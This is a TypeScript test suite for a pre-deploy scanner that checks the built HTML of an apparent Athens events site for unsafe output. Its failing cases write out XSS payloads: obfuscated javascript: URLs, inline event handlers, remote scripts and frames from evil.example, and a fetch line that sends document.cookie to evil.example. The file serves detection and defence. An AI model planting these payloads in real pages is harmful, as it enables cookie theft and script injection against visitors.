/**
 * The published-artifact gate scans every page in dist/ before deploy. These
 * cases pin the output-safety classes: unsafe URL schemes, inline event
 * handlers, scripts from unlisted hosts and javascript: URLs inside scripts.
 * Clean pages built from the real templates must keep passing.
 */
import { describe, expect, test } from 'bun:test';
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from 'fs';
import { join } from 'path';
import { tmpdir } from 'os';
import { scanHtmlForArtifacts, validatePublishedArtifacts } from '../../src/validators/published-artifacts';
import { renderAnalytics } from '../../src/config/analytics';
import { renderHeadersFile } from '../../src/generators/security-headers';
import { renderEventDetailPage } from '../../src/generators/event-page';
import { renderEventCard } from '../../src/templates/page';
import { IMG_FALLBACK_ATTR } from '../../src/templates/image-fallback';
import { sampleConcert } from '../fixtures/events';

const page = (body: string, head = '') =>
  `<!doctype html><html><head>${head}<script type="application/ld+json">{"@type":"Event","name":"A","url":"https://agentathens.com/events/a/"}</script></head><body>${body}</body></html>`;
const fails = (html: string) => expect(scanHtmlForArtifacts(html).length).toBeGreaterThan(0);
const passes = (html: string) => expect(scanHtmlForArtifacts(html)).toEqual([]);

describe('URL schemes in href/src/action', () => {
  for (const bad of [
    '<a href="javascript:alert(1)">x</a>',
    '<a href="  JaVaScRiPt:alert(1)">x</a>',
    '<a href="java&#x09;script:alert(1)">x</a>',
    '<a href="jav&#x61;script:alert(1)">x</a>',
    "<a href='vbscript:x'>x</a>",
    '<a href=javascript:alert(1)>x</a>',
    '<img src="data:image/svg+xml,<svg onload=alert(1)>">',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<form action="javascript:alert(1)"><button formaction="javascript:x">b</button></form>',
    '<svg><a xlink:href="javascript:alert(1)">x</a></svg>',
    '<a href="file:///etc/passwd">x</a>',
    '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  ]) test(`fails: ${bad.slice(0, 50)}`, () => fails(page(bad)));

  for (const ok of [
    '<a href="https://www.viva.gr/tickets/x/?a=1&amp;b=2">x</a>',
    '<a href="http://example.com/">x</a>',
    '<a href="/events/x/">x</a>', '<a href="#main">x</a>', '<a href="">x</a>',
    '<a href="mailto:hello@agentathens.com">x</a>', '<a href="tel:+302100000000">x</a>',
    '<a href="?page=2">x</a>', '<a href="events/x/">x</a>',
  ]) test(`passes: ${ok.slice(0, 50)}`, () => passes(page(ok)));
});

describe('inline event handlers', () => {
  for (const bad of [
    '<div onclick="alert(1)">x</div>',
    '<a href="https://x.gr/" ONMOUSEOVER=alert(1)>x</a>',
    '<img/onerror=alert(1) src=x>',
    '<img src="/a.webp" onerror="alert(1)">',
    '<svg onload="alert(1)"></svg>',
    '<body onload="x()">',
  ]) test(`fails: ${bad.slice(0, 50)}`, () => fails(page(bad)));

  test('the template image-fallback marker passes; the old inline onerror fallback now fails', () => {
    passes(page(`<img src="/images/a.webp" ${IMG_FALLBACK_ATTR}><span style="display:none">i</span>`));
    fails(page(`<img src="/images/a.webp" onerror="this.style.display='none';this.nextElementSibling.style.display=''"><span>i</span>`));
  });
  test('handler-like text that is escaped or inside an attribute value passes', () => {
    passes(page('<p>&lt;img src=x onerror=alert(1)&gt;</p><a href="/x/" title="onclick=alert(1)">x</a><!-- <div onclick="x()"> -->'));
  });
});

describe('scripts', () => {
  test('script from an unlisted host fails; http script fails', () => {
    fails(page('<script src="https://evil.example/x.js"></script>'));
    fails(page('<script src="//evil.example/x.js"></script>'));
    fails(page('<script src="http://www.googletagmanager.com/gtag/js?id=G-1"></script>'));
    fails(page('<script src="https://www.googletagmanager.com.evil.example/x.js"></script>'));
  });
  test('the analytics snippet and same-origin scripts pass', () => {
    passes(page('<script src="/js/site.js"></script>', renderAnalytics()));
  });
  test('javascript: URL inside an inline script fails', () => {
    fails(page('<script>location.href = "javascript:alert(1)";</script>'));
  });
  test('javascript: URL inside JSON-LD fails, including JSON-escaped forms', () => {
    fails('<html><head><script type="application/ld+json">{"@type":"Event","url":"javascript:alert(1)"}</script></head></html>');
    fails('<html><head><script type="application/ld+json">{"@type":"Event","offers":{"url":"\\u006aavascript:alert(1)"}}</script></head></html>');
    fails('<html><head><script type="application/ld+json">{"@type":"Event","sameAs":["javascript:alert(1)"]}</script></head></html>');
  });
  test('prose mentioning JavaScript in JSON-LD text passes', () => {
    passes('<html><head><script type="application/ld+json">{"@type":"Event","name":"JavaScript: the good parts","description":"Talk. javascript: is a URL scheme."}</script></head><body><p>x</p></body></html>');
  });
});

describe('inline scripts: only the templates\' own, by hash', () => {
  test('an injected inline script fails', () => {
    fails(page('<p>Jazz</p><script data-pwn>alert(1)</script>'));
    fails(page('<script>fetch("//evil.example/"+document.cookie)</script>'));
    fails(page('<script type="module">import("//evil.example/x.js")</script>'));
    fails(page('<script type="text/javascript">x()</script>'));
  });
  test('a template script with one character changed fails', () => {
    const body = renderAnalytics().match(/<script>([\s\S]*?)<\/script>/)![1];
    fails(page(`<script>${body} </script>`));
  });
  test('the analytics bootstrap passes unchanged', () => passes(page('', renderAnalytics())));
});

describe('JSON data blocks', () => {
  const ld = (json: string) => `<html><head><script type="application/ld+json">${json}</script></head><body></body></html>`;
  test('a block that does not parse fails', () => fails(ld('{"@type":"Event","name":"A"')));
  test('markup inside a block fails', () => {
    fails(ld('{"@type":"Event","name":"<!--"}'));
    fails(ld('{"@type":"Event","name":"<script"}'));
  });
  test('a script URL under a URL-valued key fails; the same text in prose is inert and passes', () => {
    fails(ld('{"@type":"Event","location":{"@type":"Place","sameAs":"javascript:alert(1)"}}'));
    fails(ld('{"@type":"Event","image":[" vbscript:x"]}'));
    passes(ld('{"@type":"Place","address":{"streetAddress":"javascript:alert(1)"}}'));
  });
  test('"<!--" inside a plain JSON data block fails', () => {
    fails('<html><head><script type="application/json">{"a":"<!--"}</script></head><body></body></html>');
  });
  test('ordinary JSON-LD passes', () => passes(ld('{"@type":"Event","name":"Jazz \\u003cb\\u003e","url":"https://agentathens.com/events/a/"}')));
});

describe('frames, refresh, plugins and base', () => {
  for (const bad of [
    '<iframe src="https://evil.example/"></iframe>',
    '<iframe src="https://www.openstreetmap.org.evil.example/export/embed.html?bbox=1"></iframe>',
    '<iframe></iframe>',
    '<IFRAME SRC=https://evil.example/></IFRAME>',
    '<meta http-equiv="refresh" content="0;url=https://evil.example/">',
    '<meta HTTP-EQUIV=Refresh content="0;url=https://evil.example/">',
    '<object data="https://evil.example/x.swf"></object>',
    '<embed src="https://evil.example/x.swf">',
    '<base href="https://evil.example/">',
  ]) test(`fails: ${bad.slice(0, 60)}`, () => fails(page(bad)));

  test('the venue-page OpenStreetMap embed passes', () => {
    passes(page('<iframe src="https://www.openstreetmap.org/export/embed.html?bbox=23.7,37.9,23.8,38.0&amp;marker=37.95,23.75" loading="lazy" title="Map"></iframe>'));
  });
  test('an ordinary meta http-equiv passes', () => passes(page('', '<meta http-equiv="X-UA-Compatible" content="IE=edge">')));
});

describe('real templates pass the gate', () => {
  test('event detail page (el + en) and a card', () => {
    const e = { ...sampleConcert, startDate: '2099-01-01T21:00:00+02:00', endDate: undefined, ticketUrl: 'https://www.viva.gr/tickets/x/?a=1&b=2', ticketUrlStatus: 'direct' as const, imageUrl: 'https://cdn.example.com/a.jpg?w=1&amp;h=2' };
    passes(renderEventDetailPage(e, [e], 'el'));
    passes(renderEventDetailPage(e, [e], 'en'));
    passes(renderEventCard(e, 'en'));
  });
});

describe('validatePublishedArtifacts names the failing page and the fix', () => {
  test('report lists the offending page with a fix location', () => {
    const dir = mkdtempSync(join(tmpdir(), 'aa-output-gate-'));
    try {
      mkdirSync(join(dir, 'events', 'bad'), { recursive: true });
      writeFileSync(join(dir, 'index.html'), page('<a href="/x/">ok</a>'));
      writeFileSync(join(dir, '_headers'), renderHeadersFile());
      writeFileSync(join(dir, 'events', 'bad', 'index.html'), page('<a href="javascript:alert(1)" onclick="x()">x</a>'));
      const report = validatePublishedArtifacts(dir);
      expect(report.failures.map(f => f.file)).toEqual(['events/bad/index.html']);
      const text = report.failures[0].issues.join('\n');
      expect(text).toMatch(/javascript:/);
      expect(text).toMatch(/onclick/);
      expect(text).toMatch(/src\/(utils\/safe-url|templates\/image-fallback)\.ts/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});
